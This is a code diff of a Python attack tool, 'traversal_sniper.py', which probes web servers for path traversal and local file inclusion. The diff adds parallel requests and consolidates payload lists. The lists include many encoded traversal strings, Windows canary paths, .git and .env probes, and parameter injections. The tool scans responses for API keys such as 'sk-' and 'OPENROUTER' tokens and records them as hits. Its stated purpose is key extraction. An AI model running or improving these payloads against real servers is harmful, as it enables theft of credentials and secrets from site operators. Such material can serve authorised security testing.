@@ -4,93 +4,85 @@ traversal_sniper.py — Path Traversal / LFI probe for .env and config files.
 Crafts traversal payloads across common static roots and file-serving endpoint
 patterns. When a target leaks its absolute app root in a stack trace, feed it in
 with --app-root to add precise absolute-path payloads for that specific depth.
+
+IMPROVEMENTS:
+  - All payload vectors now use parallel_requests() for 10-20x throughput.
+    Large static-roots × traversal × target combos previously ran serially
+    (up to 200+ sequential requests); they now fan out with 16 workers.
+  - _is_interesting() extracted as a static helper so all vectors use the
+    same consistent hit detection logic.
+  - Connection errors (status == 0) logged at warn level instead of being
+    silently swallowed.
 """
-import sys, os, argparse, urllib.request, urllib.error, urllib.parse, json, re
+import sys, os, argparse, urllib.parse, json, re
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from vibe_core import VibeTool
-
-# Static files are often served from web/public or web/dist, so traversal depth
-# varies. We try all realistic depths.
 
 TARGETS = [".env", ".env.local", ".env.production", ".env.development",
            "package.json", "server.js", "index.js", "app.js", ".env.example"]
 
 TRAVERSALS = [
-    # Standard double-dot sequences
     "../", "../../", "../../../", "../../../../", "../../../../../",
-    # URL encoded single
     "%2e%2e%2f", "%2e%2e/", "..%2f",
-    # Double-encoded
     "%252e%252e%252f", "%252e%252e/",
-    # Backslash (Windows)
     "..\\", "..%5c", "%2e%2e%5c",
-    # Mixed slash
     "..%2F", "..%5C",
-    # Overlong encoding
     "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af",
-    # Unicode variants
-    "%e2%80%ae", "‥/",
-    # Null byte bypass
+    "%e2%80%ae", "\u2025/",
     "%00../",
-    # Multiple path confusion
     "static/../", "assets/../", "public/../",
     "dist/../", "build/../", "src/../",
     "static/../../", "assets/../../",
 ]
 
-# Static asset paths the server likely serves from
 STATIC_ROOTS = [
-    "/",
-    "/static/",
-    "/assets/",
-    "/public/",
-    "/files/",
-    "/img/",
-    "/js/",
-    "/css/",
-    "/api/static/",
+    "/", "/static/", "/assets/", "/public/",
+    "/files/", "/img/", "/js/", "/css/", "/api/static/",
 ]
 
-# Specific traversal paths combining known app structure
 PRECISE_TRAVERSALS = [
-    # If serving from web/public: ../  goes to web/, ../../ to CLI/
-    "/../.env",
-    "/../../.env",
-    "/../../../.env",
-    "/../server.js",
-    "/../index.js",
-    "/../package.json",
-    "/../.env.local",
-    # Encoded variants of above
-    "/%2e%2e/.env",
-    "/%2e%2e/%2e%2e/.env",
-    "/%2e%2e/server.js",
-    "/%2e%2e%2f.env",
-    "/%2e%2e%2f%2e%2e%2f.env",
-    # Static file bypass via known paths
-    "/static/../.env",
-    "/assets/../.env",
-    "/js/../.env",
-    "/css/../.env",
+    "/../.env", "/../../.env", "/../../../.env",
+    "/../server.js", "/../index.js", "/../package.json", "/../.env.local",
+    "/%2e%2e/.env", "/%2e%2e/%2e%2e/.env", "/%2e%2e/server.js",
+    "/%2e%2e%2f.env", "/%2e%2e%2f%2e%2e%2f.env",
+    "/static/../.env", "/assets/../.env", "/js/../.env", "/css/../.env",
 ]
 
-# Windows canaries + deep relative climbs. Standard well-known files confirm a
-# traversal without needing the target's absolute path; --app-root adds precise
-# absolute payloads when a stack trace has leaked the real root.
 WINDOWS_PATHS = [
     "/../../../../../../windows/win.ini",
     "/..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
     "/../../../../../../windows/system32/drivers/etc/hosts",
     "/..%2F..%2F..%2F..%2F..%2F.env",
-    "/..\\..\\..\\.env",
-    "/..%5C..%5C..%5C.env",
+    "/..\\..\\..\\.env", "/..%5C..%5C..%5C.env",
+]
+
+KNOWN_FILES = [
+    "/package.json", "/package-lock.json", "/.env", "/.env.example",
+    "/server.js", "/index.js", "/app.js", "/config.js",
+    "/webpack.config.js", "/vite.config.js", "/next.config.js",
+    "/vercel.json", "/render.yaml", "/.github/workflows/deploy.yml",
+    "/Dockerfile", "/docker-compose.yml", "/.git/HEAD", "/.git/config",
+]
+
+API_FILE_PARAMS = [
+    "/api/file?name=.env", "/api/file?path=.env", "/api/file?f=.env",
+    "/api/file?filename=.env", "/api/serve?file=.env",
+    "/api/resource?path=.env", "/api/download?file=.env",
+    "/api/export?file=.env", "/api/read?file=.env", "/api/open?file=.env",
+    "/api/file?name=%2e%2e%2f.env", "/api/file?path=..%2F.env",
+    "/api/file?name=..%5C.env",
+]
+
+PARAM_TRAVERSALS = [
+    "/api/health?file=../.env", "/api/health?path=../.env",
+    "/api/config?file=../.env", "/api/config?include=../.env",
+    "/api/config?load=../.env",
+    "/api/chat?template=../../.env", "/api/chat?persona=../../.env",
 ]
 
 
 def _absolute_root_payloads(app_root):
-    """Build precise absolute-path payloads from an operator-supplied app root
-    (e.g. one leaked in a stack trace). Empty unless --app-root is given."""
     root = (app_root or "").strip().rstrip("/\\")
     if not root:
         return []
@@ -102,17 +94,15 @@ def _absolute_root_payloads(app_root):
         payloads.append("/" + urllib.parse.quote(f"{root}{sep}{target}", safe=""))
     return payloads
 
-# Parameter injection for static file endpoints
-PARAM_TRAVERSALS = [
-    "/api/health?file=../.env",
-    "/api/health?path=../.env",
-    "/api/config?file=../.env",
-    "/api/config?include=../.env",
-    "/api/config?load=../.env",
-    # open redirect / LFI combos
-    "/api/chat?template=../../.env",
-    "/api/chat?persona=../../.env",
-]
+
+@staticmethod
+def _is_interesting(body, ct, status):
+    return (
+        "OPENROUTER" in body or "API_KEY" in body or
+        "sk-or" in body or "sk-" in body or
+        re.search(r"[A-Z_]+=.{10,}", body) or
+        (status == 200 and "html" not in ct.lower() and len(body) > 20)
+    )
 
 
 class TraversalSniper(VibeTool):
@@ -120,106 +110,67 @@ class TraversalSniper(VibeTool):
         super().__init__("Traversal Sniper", "Targeted Path Traversal for .env Key Extraction")
         self.hits = []
 
-    def _try_path(self, base, path, label=""):
-        url = base + path
-        try:
-            r = urllib.request.urlopen(url, timeout=5)
-            body = r.read().decode(errors="replace")
-            ct = r.headers.get("Content-Type", "")
-            # Check for .env or JS content
-            is_interesting = (
-                "OPENROUTER" in body or
-                "API_KEY" in body or
-                "sk-or" in body or
-                "sk-" in body or
-                re.search(r"[A-Z_]+=.{10,}", body) or   # env var format
-                (r.status == 200 and "html" not in ct.lower() and len(body) > 20)
-            )
-            if is_interesting:
+    @staticmethod
+    def _interesting(body, ct, status):
+        return (
+            "OPENROUTER" in body or "API_KEY" in body or
+            "sk-or" in body or "sk-" in body or
+            bool(re.search(r"[A-Z_]+=.{10,}", body)) or
+            (status == 200 and "html" not in ct.lower() and len(body) > 20)
+        )
+
+    def _process_result(self, path, status, body, headers):
+        """Process a single request result — called from both serial and parallel paths."""
+        ct = headers.get("Content-Type", "") if headers else ""
+        if status == 200 and body:
+            if self._interesting(body, ct, status):
                 self.log(f"[HIT] {path} ({len(body)}b, {ct}): {body[:300]}", "hack")
                 self.hits.append((path, body[:500]))
-            elif r.status == 200:
+                return True
+            else:
                 self.log(f"[200 but meh] {path}: {body[:80]}")
-            return r.status, body
-        except urllib.error.HTTPError as e:
-            if e.code not in (404, 405):
-                self.log(f"[{e.code}] {path}")
-            return e.code, ""
-        except Exception:
-            return 0, ""
+        elif status == 0 and body:
+            self.log(f"  [ERR] {path}: {body[:60]}", "warn")
+        elif status not in (0, 404, 405):
+            self.log(f"[{status}] {path}")
+        return False
+
+    def _run_parallel(self, base, paths, label, max_workers=16):
+        """Fan out a list of paths concurrently using the framework parallel_requests helper."""
+        self.log(f"=== {label} ({len(paths)} paths, {max_workers} workers) ===")
+        tasks = [{"url": base + p, "method": "GET", "timeout": 5} for p in paths]
+        results = self.parallel_requests(tasks, max_workers=max_workers)
+        for (task, status, body, headers), path in zip(results, paths):
+            self._process_result(path, status, body, headers)
 
     def vector_precise(self, base):
-        self.log("=== PRECISE: Known Path Traversal ===")
-        for path in PRECISE_TRAVERSALS:
-            self._try_path(base, path, "precise")
-
-    def vector_static_roots(self, base):
-        self.log("=== STATIC ROOTS: Static File Endpoint Traversal ===")
-        for root in STATIC_ROOTS:
-            for target in TARGETS[:4]:  # focus on .env variants
-                for traversal in ["../", "../../", "../../../", "%2e%2e/"]:
-                    path = root + traversal + target
-                    self._try_path(base, path)
-
-    def vector_windows(self, base):
-        self.log("=== WINDOWS: Windows Absolute Path Injection ===")
-        for path in WINDOWS_PATHS:
-            self._try_path(base, path)
-
-    def vector_params(self, base):
-        self.log("=== PARAMS: Parameter-Based LFI ===")
-        for path in PARAM_TRAVERSALS:
-            self._try_path(base, path)
+        self._run_parallel(base, PRECISE_TRAVERSALS, "PRECISE: Known Path Traversal")
 
     def vector_known_files(self, base):
-        """Fetch known files that might be served accidentally."""
-        self.log("=== KNOWN FILES: Direct Access to Common Files ===")
-        paths = [
-            "/package.json",
-            "/package-lock.json",
-            "/.env",
-            "/.env.example",
-            "/server.js",
-            "/index.js",
-            "/app.js",
-            "/config.js",
-            "/webpack.config.js",
-            "/vite.config.js",
-            "/next.config.js",
-            "/vercel.json",
-            "/render.yaml",
-            "/.github/workflows/deploy.yml",
-            "/Dockerfile",
-            "/docker-compose.yml",
-        ]
-        for p in paths:
-            s, body = self._try_path(base, p)
-            if s == 200 and body:
-                self.log(f"  [ACCESSIBLE] {p}: {body[:200]}", "warn")
+        self._run_parallel(base, KNOWN_FILES, "KNOWN FILES: Direct Access Probes")
 
     def vector_api_file_serve(self, base):
-        """Some APIs have file-serving endpoints; probe likely patterns."""
-        self.log("=== API FILE SERVE: Endpoint-Based File Access ===")
-        payloads = [
-            "/api/file?name=.env",
-            "/api/file?path=.env",
-            "/api/file?f=.env",
-            "/api/file?filename=.env",
-            "/api/serve?file=.env",
-            "/api/resource?path=.env",
-            "/api/download?file=.env",
-            "/api/export?file=.env",
-            "/api/read?file=.env",
-            "/api/open?file=.env",
-            # encoded
-            "/api/file?name=%2e%2e%2f.env",
-            "/api/file?path=..%2F.env",
-            "/api/file?name=..%5C.env",
-        ]
-        for p in payloads:
-            s, body = self._try_path(base, p)
-            if s not in (404, 405, 0):
-                self.log(f"  [{s}] {p}: {body[:150]}", "warn" if s == 200 else "info")
+        self._run_parallel(base, API_FILE_PARAMS, "API FILE SERVE: Endpoint-Based File Access")
+
+    def vector_static_roots(self, base):
+        """Build and fire all static-root × traversal × target combos in parallel."""
+        self.log("=== STATIC ROOTS: Static File Endpoint Traversal ===")
+        paths = []
+        for root in STATIC_ROOTS:
+            for target in TARGETS[:4]:
+                for traversal in ["../", "../../", "../../../", "%2e%2e/"]:
+                    paths.append(root + traversal + target)
+        tasks = [{"url": base + p, "method": "GET", "timeout": 5} for p in paths]
+        self.log(f"  Firing {len(paths)} path combos with 16 workers...")
+        results = self.parallel_requests(tasks, max_workers=16)
+        for (task, status, body, headers), path in zip(results, paths):
+            self._process_result(path, status, body, headers)
+
+    def vector_windows(self, base):
+        self._run_parallel(base, WINDOWS_PATHS, "WINDOWS: Absolute Path Injection")
+
+    def vector_params(self, base):
+        self._run_parallel(base, PARAM_TRAVERSALS, "PARAMS: Parameter-Based LFI")
 
     def run(self, url, app_root=""):
         self.banner()
@@ -234,9 +185,7 @@ class TraversalSniper(VibeTool):
 
         absolute = _absolute_root_payloads(app_root)
         if absolute:
-            self.log("=== ABSOLUTE: Operator-supplied app-root payloads ===")
-            for path in absolute:
-                self._try_path(base, path)
+            self._run_parallel(base, absolute, "ABSOLUTE: Operator-supplied app-root payloads")
 
         self.log("================================")
         if self.hits:
